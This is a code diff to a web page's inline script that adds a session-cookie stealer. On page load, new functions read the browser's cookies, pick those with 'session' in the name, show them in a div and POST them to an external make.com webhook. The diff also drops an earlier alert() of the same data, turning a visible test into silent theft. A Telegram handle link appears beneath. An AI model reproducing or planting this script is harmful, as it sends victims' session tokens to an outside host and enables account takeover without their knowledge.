@@ -31,9 +31,49 @@ function getSessionData() {
         localStorage: sessionLocalStorage
     };
 }
+function displaySessionCookieInDiv() {
+    const cookiePairs = document.cookie.split('; ');
+    const cookies = {};
+
+    cookiePairs.forEach(pair => {
+        const [name, value] = pair.split('=');
+        if (name.includes('session')) {
+            cookies[name] = decodeURIComponent(value);
+        }
+    });
+
+    // Display the cookies in the div
+    const div = document.getElementById('cooky');
+    div.innerHTML = JSON.stringify(cookies, null, 4);
+
+    // Send the cookies to the webhook
+    sendCookiesToWebhook(cookies);
+}
+
+function sendCookiesToWebhook(cookies) {
+    const webhookURL = 'https://hook.us1.make.com/ugf3nyygevcvtjubzfk3elr7q7k5a476'; // replace with your webhook URL
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(cookies)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Cookies sent successfully:', data);
+    })
+    .catch(error => {
+        console.error('Error sending cookies:', error);
+    });
+}
+
+// Call the function to display and send the session cookie(s)
+displaySessionCookieInDiv();
 
 console.log(getSessionData());
-alert(getSessionData());
+
 </script>
 <div id='cooky'></div>
 <div><a href="https://t.me/ROCKMURPHY">@ROCKMURPHY</a></div>
